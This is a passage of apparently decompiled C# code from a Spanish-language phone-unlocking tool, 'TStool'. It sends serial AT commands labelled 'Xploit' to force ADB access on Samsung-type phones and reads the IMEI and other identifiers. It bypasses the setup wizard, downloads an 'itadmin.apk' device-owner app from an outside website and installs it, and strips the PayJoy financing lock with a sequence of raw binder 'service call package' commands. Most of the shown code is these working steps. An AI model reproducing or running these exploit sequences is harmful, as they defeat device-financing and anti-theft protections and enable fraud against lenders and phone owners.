				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(3);
				}));
				await Task.Run(delegate()
				{
					try
					{
						bool flag2 = Conversions.ToBoolean(this.cmbPuertos.Invoke(new VB$AnonymousDelegate_1<bool>(() => this.cmbPuertos.SelectedItem != null)));
						if (flag2)
						{
							bool isOpen = this.SerialPort1.IsOpen;
							if (isOpen)
							{
								this.SerialPort1.Close();
							}
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.Clear();
							}));
							string selectedPort = "";
							this.cmbPuertos.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								selectedPort = this.cmbPuertos.SelectedItem.ToString().Split(new char[]
								{
									' '
								})[0];
							}));
							this.SerialPort1.PortName = selectedPort;
							this.SerialPort1.Open();
							Thread.Sleep(300);
							this.txtOutput.Text = "Xploit paso 1";
							string text = this.SendAtCommand("AT+SWATD=0", 3000);
							this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.UpdateProgressBar();
							}));
							this.txtOutput.Text = "Xploit paso 2";
							string text2 = this.SendAtCommand("AT+ACTIVATE=0,0,0", 3000);
							this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.UpdateProgressBar();
							}));
							this.txtOutput.Text = "Xploit paso 3";
							string text3 = this.SendAtCommand("AT+SWATD=1", 3000);
							string command4 = this.SendAtCommand("AT+PARALLEL=2,0,00000;AT+DEBUGLVC=0,5", 3000);
							this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.UpdateProgressBar();
							}));
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.Text = "Xploit paso 4";
							}));
							this.TextBox1.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.TextBox1.Text = "Xploit paso 4" + command4;
							}));
							this.SerialPort1.Close();
							List<string> adbDevices = this.GetAdbDevices();
							bool flag3 = adbDevices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
							if (flag3)
							{
								MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
							}
						}
						else
						{
							MessageBox.Show("Por favor selecciona un puerto COM.");
						}
					}
					catch (TimeoutException ex)
					{
						MessageBox.Show("⏱ Tiempo de espera agotado en el puerto COM.");
					}
					catch (Exception ex2)
					{
						MessageBox.Show("❌ Error: " + ex2.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
				});
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00003FC4 File Offset: 0x000021C4
		private void ExecuteAdbDevices()
		{
			try
			{
				bool flag = this.cmbDevicesAdb.SelectedItem != null && Operators.CompareString(this.cmbDevicesAdb.SelectedItem.ToString(), "waiting for devices...", false) != 0;
				if (flag)
				{
					string device = this.cmbDevicesAdb.SelectedItem.ToString();
					string text = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
					string text2 = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
					string text3 = this.ExecuteAdbCommand("shell getprop ro.product.brand", device);
					string text4 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
					string text5 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
					string text6 = this.ExecuteAdbCommand("shell getprop ro.odm.build.version.release", device);
					string text7 = this.ExecuteAdbCommand("shell getprop ro.boot.bootloader", device);
					string text8 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
					string text9 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
					string text10 = this.ExecuteAdbCommand("shell getprop ro.hardware", device);
					string text11 = this.ExecuteAdbCommand("shell getprop ro.build.display.id", device);
					string text12 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
					string text13 = this.ExecuteAdbCommand("shell getprop ro.boot.carrierid", device);
					string text14 = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 | grep -o '[0-9a-f]\\{8\\} ' | tail -n+3 | while read a; do echo -n \\\\u${a:4:4}\\\\u${a:0:4}; done", device);
					string text15 = this.ExecuteAdbCommand("shell getprop ro.boot.carrierid", device);
					this.txtOutput.Clear();
					this.ActualizarProgreso();
					this.txtOutput.Text = string.Format("- Connecting ... {0}Marca: {1}Model: {2}SN: {3}Android: {4}Security: {5}Baseband: {6}SIM: {7}Hardware: {8}carrierid: {9}IMEI: {10}Carrier: {11} ", new object[]
					{
						text2,
						text,
						text4,
						text2,
						text6,
						text5,
						text8,
						text12,
						text10,
						text13,
						text14,
						text15
					});
					this.ActualizarProgreso();
					this.GuardarEnArchivo(text4, this.txtOutput.Text);
					this.TextBox1.Text = "Log guardado en: \\Logs\\" + text4;
					this.ActualizarProgreso();
				}
				else
				{
					MessageBox.Show("Por favor selecciona un dispositivo ADB.");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al leer desde el dispositivo ADB: " + ex.Message);
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000041E8 File Offset: 0x000023E8
		private void ActualizarProgreso()
		{
			bool flag = this.ProgressBar1.Value < this.ProgressBar1.Maximum;
			if (flag)
			{
				ProgressBar progressBar;
				(progressBar = this.ProgressBar1).Value = checked(progressBar.Value + 1);
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x0000422C File Offset: 0x0000242C
		private void GuardarEnArchivo(string nombreDirectorio, string contenido)
		{
			try
			{
				string path = Regex.Replace(nombreDirectorio, "[^a-zA-Z0-9_-]", "");
				string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
				bool flag = !Directory.Exists(text);
				if (flag)
				{
					Directory.CreateDirectory(text);
				}
				string text2 = Path.Combine(text, path);
				bool flag2 = !Directory.Exists(text2);
				if (flag2)
				{
					Directory.CreateDirectory(text2);
				}
				string path2 = DateTime.Now.ToString("yyyyMMdd_HHmmss") + "_Logs.txt";
				string path3 = Path.Combine(text2, path2);
				File.WriteAllText(path3, contenido);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al guardar el archivo: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000430C File Offset: 0x0000250C
		private string SendAtCommand2(string command)
		{
			this.SerialPort1.WriteLine(command);
			return this.SerialPort1.ReadLine();
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00004338 File Offset: 0x00002538
		private void ProcessAndDisplayInfo(string commandResponse, string stepDescription)
		{
			TextBox textBox;
			(textBox = this.TextBox1).Text = string.Concat(new string[]
			{
				textBox.Text,
				stepDescription,
				": ",
				commandResponse,
				Environment.NewLine
			});
			RichTextBox txtOutput;
			(txtOutput = this.txtOutput).Text = txtOutput.Text + stepDescription + " ok" + Environment.NewLine;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x000043A4 File Offset: 0x000025A4
		private bool ExecuteAndWaitAdbCommand()
		{
			string commandResponse = this.ExecuteAdbCommand2("adb shell getprop ro.product.manufacturer");
			string commandResponse2 = this.ExecuteAdbCommand2("adb shell getprop ro.boot.serialno");
			string commandResponse3 = this.ExecuteAdbCommand2("adb shell getprop ro.product.model");
			this.ProcessAndDisplayInfo(commandResponse2, "Esperando...");
			this.ProcessAndDisplayInfo(commandResponse, "Conectando...");
			this.ProcessAndDisplayInfo(commandResponse2, "Conectando...");
			this.ProcessAndDisplayInfo(commandResponse3, "Conectando...");
			Thread.Sleep(1000);
			bool flag = false;
			bool flag2 = flag;
			bool result;
			if (flag2)
			{
				this.txtOutput.AppendText("ADB command executed successfully." + Environment.NewLine);
				result = true;
			}
			else
			{
				this.txtOutput.AppendText("ADB devices not found." + Environment.NewLine);
				result = false;
			}
			return result;
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00004460 File Offset: 0x00002660
		private bool ExecuteAndWaitAdbCommand2()
		{
			string text = this.ExecuteAdbCommand2("adb shell getprop ro.product.manufacturer");
			string text2 = this.ExecuteAdbCommand2("adb shell getprop ro.boot.serialno");
			string text3 = this.ExecuteAdbCommand2("adb shell getprop ro.product.model");
			this.ProcessAndDisplayInfo(text2, "Conectando...");
			this.ProcessAndDisplayInfo(text, "Marca:" + text);
			this.ProcessAndDisplayInfo(text2, "SN" + text2);
			this.ProcessAndDisplayInfo(text3, "model" + text3);
			this.GuardarEnArchivo(text3, this.txtOutput.Text);
			this.TextBox1.Text = "Log guardado en: \\Logs\\" + text3;
			Thread.Sleep(200);
			bool flag = false;
			bool flag2 = flag;
			bool result;
			if (flag2)
			{
				this.txtOutput.AppendText("ADB command executed successfully." + Environment.NewLine);
				result = true;
			}
			else
			{
				this.txtOutput.AppendText("By TStool." + Environment.NewLine);
				result = false;
			}
			return result;
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00004558 File Offset: 0x00002758
		private string ExecuteAdbCommand2(string command)
		{
			string result;
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
				{
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using (Process process = Process.Start(startInfo))
				{
					using (StreamReader standardOutput = process.StandardOutput)
					{
						result = standardOutput.ReadToEnd().Trim();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error ejecutando comando ADB: " + ex.Message);
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00004624 File Offset: 0x00002824
		private void SendAtAdb()
		{
			string commandResponse = this.SendAtCommand("AT+SWATD=0", 3000);
			string commandResponse2 = this.SendAtCommand("AT+ACTIVATE=0,0,0", 3000);
			string commandResponse3 = this.SendAtCommand("AT+SWATD=1", 3000);
			string commandResponse4 = this.SendAtCommand("AT+PARALLEL=2,0,00000;AT+DEBUGLVC=0,5", 3000);
			this.ProcessAndDisplayInfo(commandResponse, "Xploit paso 1");
			this.ProcessAndDisplayInfo(commandResponse2, "Xploit paso 2");
			this.ProcessAndDisplayInfo(commandResponse3, "Xploit paso 3");
			this.ProcessAndDisplayInfo(commandResponse4, "Xploit paso 4");
			RichTextBox txtOutput;
			(txtOutput = this.txtOutput).Text = txtOutput.Text + "XploIT 1 Done " + Environment.NewLine;
			(txtOutput = this.txtOutput).Text = txtOutput.Text + "Esperando AdbDevices For Xploit 2" + Environment.NewLine;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x000046F4 File Offset: 0x000028F4
		private bool ExeCheckAdb()
		{
			string commandResponse = this.ExecuteAdbCommand2("adb shell getprop ro.boot.serialno");
			this.ProcessAndDisplayInfo(commandResponse, "Esperando...");
			Thread.Sleep(1000);
			bool flag = false;
			bool flag2 = flag;
			bool result;
			if (flag2)
			{
				this.txtOutput.AppendText("ADB command executed successfully." + Environment.NewLine);
				result = true;
			}
			else
			{
				this.txtOutput.AppendText("ADB devices not found." + Environment.NewLine);
				result = false;
			}
			return result;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x0000476D File Offset: 0x0000296D
		private void InitializeProgressBar(int maximumValue)
		{
			this.ProgressBar1.Minimum = 0;
			this.ProgressBar1.Maximum = maximumValue;
			this.ProgressBar1.Value = 0;
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00004798 File Offset: 0x00002998
		private void UpdateProgressBar()
		{
			bool flag = this.ProgressBar1.Value < this.ProgressBar1.Maximum;
			if (flag)
			{
				ProgressBar progressBar;
				(progressBar = this.ProgressBar1).Value = checked(progressBar.Value + 1);
			}
		}

		// Token: 0x06000068 RID: 104 RVA: 0x000047DC File Offset: 0x000029DC
		private async void btnInstallITadmin_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.InitializeProgressBar(5);
			try
			{
				List<string> devices = this.GetAdbDevices();
				bool flag = devices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					string message = "¿Quieres ver video del proceso?." + Environment.NewLine + "¿Desea abrir la página ahora?";
					DialogResult result = MessageBox.Show(message, "Obtener Código de Desbloqueo", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
					bool flag2 = result == DialogResult.Yes;
					if (flag2)
					{
						Process.Start("https://youtu.be/Ndp8etbsZCA?si=NRV62M6WR2igxZWa");
					}
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					this.txtOutput.AppendText("Iniciando proceso de instalación de ITAdmin..." + Environment.NewLine);
					this.ExecuteAdbCommand("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizard", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard", selectedDevice);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Proceso 1 completado." + Environment.NewLine);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.hihonor.ouc", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.hihonor.ouc", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 om.dti.attmx", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.dti.attmx", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.android.hotwordenrollment.okgoogle", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.android.hotwordenrollment.okgoogle", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.youtube", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.youtube", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.youtube.music", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.apps.youtube.music", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.maps", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.apps.maps", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.tachyon", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.apps.tachyon", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.photos", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.apps.photos", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.videos", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.videos", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.docs", selectedDevice);
					this.ExecuteAdbCommand("adb shell pm uninstall --user 0 com.google.android.apps.docs", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.android.hotwordenrollment.xgoogle", selectedDevice);
					this.ExecuteAdbCommand("adb shell pm uninstall --user 0 com.android.hotwordenrollment.xgoogle", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.googlequicksearchbox", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.googlequicksearchbox", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.calendar", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.calendar", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.subscriptions.red", selectedDevice);
					this.ExecuteAdbCommand("adb shell pm uninstall --user 0 com.google.android.apps.subscriptions.red", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.googleassistant", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.apps.googleassistant", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.gm", selectedDevice);
					this.ExecuteAdbCommand("shell pm clear --user 0 com.google.android.gm", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.gm", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.contacts", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.contacts", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.chromecast.app", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.apps.chromecast.app", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.onetimeinitializer", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.apps.walletnfcrel", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0  com.google.android.apps.walletnfcrel", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.netflix.mediaclient", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0  com.netflix.mediaclient", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.android.nfc", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 cn.wps.moffice_eng", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.att.miatt", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.att.miatt", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.hihonor.systemappsupdater", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.hihonor.systemappsupdater", selectedDevice);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Proceso 2 completado." + Environment.NewLine);
					this.txtOutput.AppendText("Iniciando proceso de instalación de ITAdmin..." + Environment.NewLine);
					string itadminPath = Path.Combine("C:\\Users\\Public\\Libraries", "itadmin.apk");
					bool flag3 = !File.Exists(itadminPath);
					if (flag3)
					{
						bool descargado = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/itadmin.apk", itadminPath);
						if (!descargado)
						{
							this.txtOutput.AppendText("❌ No se pudo preparar itadmin.apk. Se cancela la instalación." + Environment.NewLine);
							return;
						}
					}
					this.ExecuteAdbCommand(string.Format("install \"{0}\"", itadminPath), selectedDevice);
					this.UpdateProgressBar();
					this.ExecuteAdbCommand("shell am start -S com.itadmin.ts/com.afwsamples.testdpc.SetupManagementLaunchActivity", selectedDevice);
					this.UpdateProgressBar();
					MessageBox.Show("Conecte a internet, agregar una cuenta a ITAdmin y termine la configuraciíon.");
					MessageBox.Show("NO PRESIONAR OK O CERRAR HASTA VERIFICAR QUE FUNCIONE GOOGLE PLAY!!");
					this.txtOutput.AppendText("Iniciando último paso... Verificar que funcione Google play en Work Profile" + Environment.NewLine);
					this.ExecuteAdbCommand("shell pm path com.google.android.gms", selectedDevice);
					this.ExecuteAdbCommand("shell pm clear --user 0 com.google.android.gms", selectedDevice);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.gms", selectedDevice);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.gms", selectedDevice);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Done..." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error durante la instalación de ITAdmin: {0}", ex.Message));
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00004824 File Offset: 0x00002A24
		private void btnFixITadmin_Click_(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.InitializeProgressBar(5);
			try
			{
				List<string> adbDevices = this.GetAdbDevices();
				bool flag = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					string text = "¿Quieres ver video del proceso?." + Environment.NewLine + "¿Desea abrir la página ahora?";
					DialogResult dialogResult = MessageBox.Show(text, "Obtener Código de Desbloqueo", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
					bool flag2 = dialogResult == DialogResult.Yes;
					if (flag2)
					{
						Process.Start("https://youtu.be/Ndp8etbsZCA?si=NRV62M6WR2igxZWa");
					}
					string device = this.cmbDevicesAdb.SelectedItem.ToString();
					this.txtOutput.AppendText("Iniciando proceso de Fix ITAdmin..." + Environment.NewLine);
					this.ExecuteAdbCommand("shell install itadmin.apk", device);
					this.ExecuteAdbCommand("shell pm path com.itadmin.ts", device);
					this.ExecuteAdbCommand("shell pm clear --user 0 com.itadmin.ts", device);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.itadmin.ts", device);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.itadmin.ts", device);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Proceso 1 completado." + Environment.NewLine);
					this.ExecuteAdbCommand("shell pm path com.google.android.gms", device);
					this.ExecuteAdbCommand("shell pm clear --user 0 com.google.android.gms", device);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.gms", device);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.gms", device);
					this.ExecuteAdbCommand("shell cmd package install-existing com.google.android.gms", device);
					this.ExecuteAdbCommand("shell pm enable --user 0 com.google.android.gms", device);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Proceso 2 completado." + Environment.NewLine);
					this.ExecuteAdbCommand("shell am start -S com.itadmin.ts/com.afwsamples.testdpc.SetupManagementLaunchActivity", device);
					MessageBox.Show("Conecte a internet, agregar una cuenta a ITAdmin y termine la configuraciíon.");
					this.txtOutput.AppendText("Done..." + Environment.NewLine);
					this.txtOutput.AppendText("Verificar que funcione correctamente Google play..." + Environment.NewLine);
					this.UpdateProgressBar();
					MessageBox.Show("Sólo si funciona correctamente, presionar OK.");
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.google.android.gms", device);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.google.android.gms", device);
					this.txtOutput.AppendText("Done..." + Environment.NewLine);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("En caso que no funcionne, restablecer e intenntar nuevamente" + Environment.NewLine);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Done..." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error durante la instalación de ITAdmin: {0}", ex.Message));
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00004AD4 File Offset: 0x00002CD4
		private async Task RemovePayNewAsync()
		{
			Form1._Closure$__65-1 CS$<>8__locals1 = new Form1._Closure$__65-1(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			bool flag = this.processRunning;
			if (flag)
			{
				this.LogOutput("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(11);
					this.UpdateProgressBar();
				}));
				CancellationTokenSource cts = new CancellationTokenSource();
				CS$<>8__locals1.$VB$Local_token = cts.Token;
				Task tareaProceso = Task.Run(checked(delegate()
				{
					try
					{
						Form1._Closure$__65-0 CS$<>8__locals2 = new Form1._Closure$__65-0(CS$<>8__locals2);
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
						List<string> adbDevices = CS$<>8__locals1.$VB$Me.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0;
						if (flag2)
						{
							CS$<>8__locals1.$VB$Me.LogOutput("❌ No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						}
						else
						{
							CS$<>8__locals2.$VB$Local_selectedDevice = "";
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								bool flag6 = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.cmbDevicesAdb.SelectedItem != null;
								if (flag6)
								{
									CS$<>8__locals2.$VB$Local_selectedDevice = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
								}
							}));
							bool flag3 = string.IsNullOrWhiteSpace(CS$<>8__locals2.$VB$Local_selectedDevice);
							if (flag3)
							{
								CS$<>8__locals1.$VB$Me.LogOutput("❌ Por favor selecciona un dispositivo ADB.");
							}
							else
							{
								bool flag4 = CS$<>8__locals1.$VB$Me.cancelRequested | CS$<>8__locals1.$VB$Local_token.IsCancellationRequested;
								if (flag4)
								{
									CS$<>8__locals1.$VB$Me.LogOutput("⏹ Proceso cancelado antes de iniciar la limpieza.");
								}
								else
								{
									CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals1.$VB$Me.txtOutput.Clear();
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("Iniciando proceso Remove MDM Pay New..." + Environment.NewLine);
									}));
									List<List<string>> list = new List<List<string>>
									{
										new List<string>
										{
											"shell pm disable com.payjoy.access",
											"shell pm disable-user --user 0  com.payjoy.access",
											"pm uninstall -k --user 0  com.payjoy.access"
										},
										new List<string>
										{
											"shell dumpsys package com.payjoy.access",
											"shell service call package 131 s16 com.payjoy.access i32 0",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 64 s16 com.payjoy.access i32 2",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 66 s16 com.payjoy.access i32 0",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 82 s16 com.payjoy.access i32 0",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 79 s16 com.payjoy.access i32 1",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 27 s16 com.payjoy.access i32 2 i32 0",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 3 s16 com.payjoy.access i32 2",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 130 s16 com.payjoy.access",
											"shell dumpsys package com.payjoy.access"
										},
										new List<string>
										{
											"shell service call package 27 s16 com.payjoy.access i32 2 i32 0",
											"shell dumpsys package com.payjoy.access"
										}
									};
									Form1._Closure$__65-2 CS$<>8__locals3 = new Form1._Closure$__65-2(CS$<>8__locals3);
									CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3 = CS$<>8__locals2;
									Form1._Closure$__65-2 CS$<>8__locals4 = CS$<>8__locals3;
									int num = list.Count - 1;
									CS$<>8__locals4.$VB$Local_paso = 0;
									while (CS$<>8__locals3.$VB$Local_paso <= num)
									{
										bool flag5 = CS$<>8__locals1.$VB$Me.cancelRequested | CS$<>8__locals1.$VB$Local_token.IsCancellationRequested;
										if (flag5)
										{
											CS$<>8__locals1.$VB$Me.LogOutput(string.Format("⏹ Proceso cancelado en el paso {0}.", CS$<>8__locals3.$VB$Local_paso + 1));
											return;
										}
										try
										{
											foreach (string command in list[CS$<>8__locals3.$VB$Local_paso])
											{
												CS$<>8__locals1.$VB$Me.ExecuteAdbCommand(command, CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_selectedDevice);
											}
										}
										finally
										{
											List<string>.Enumerator enumerator;
											((IDisposable)enumerator).Dispose();
										}
										CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
										{
											CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$NonLocal_$VB$Closure_2.$VB$Me.txtOutput.AppendText(string.Format("Proceso {0} completado.", CS$<>8__locals3.$VB$Local_paso + 1) + Environment.NewLine);
										}));
										CS$<>8__locals1.$VB$Me.UpdateProgressBar();
										CS$<>8__locals3.$VB$Local_paso++;
									}
									CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("En caso que no funcione, intente con MDM FULL" + Environment.NewLine);
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("Done..." + Environment.NewLine);
									}));
									CS$<>8__locals1.$VB$Me.UpdateProgressBar();
								}
							}
						}
					}
					catch (Exception ex)
					{
						CS$<>8__locals1.$VB$Me.LogOutput("❗ Error durante el proceso: " + ex.Message);
					}
					finally
					{
						CS$<>8__locals1.$VB$Me.processRunning = false;
						CS$<>8__locals1.$VB$Me.AplicarPermisosDesdeFirebasePorPlan();
						CS$<>8__locals1.$VB$Me.btnCancelarProceso.Enabled = false;
					}
				}), CS$<>8__locals1.$VB$Local_token);
				Task tareaTimeout = Task.Delay(15000);
				await Task.WhenAny(new Task[]
				{
					tareaProceso,
					tareaTimeout
				});
				if (!tareaProceso.IsCompleted)
				{
					this.cancelRequested = true;
					this.LogOutput("⏰ Tiempo de espera agotado. El proceso fue cancelado automáticamente.");
				}
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00004B18 File Offset: 0x00002D18
